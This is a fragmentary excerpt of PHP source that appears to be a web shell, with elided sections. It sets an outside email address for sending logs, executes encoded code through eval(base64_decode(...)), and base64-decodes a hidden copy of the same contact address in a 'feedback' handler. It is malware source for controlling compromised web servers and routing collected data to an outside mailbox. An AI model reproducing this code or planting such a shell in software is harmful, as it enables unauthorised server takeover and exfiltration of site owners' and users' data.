...
$tmpdir = ""; 
$tmpdir_log = "./";
$log_email = "saviours@operamail.com"; //email untuk pengiriman log.
...
$shell_data = ""; eval(base64_decode($shell_data));
...
if ($act == "feedback") {
  $suppmail = base64_decode("c2F2aW91cnNAb3BlcmFtYWlsLmNvbQ==");
  if (!empty($submit)){
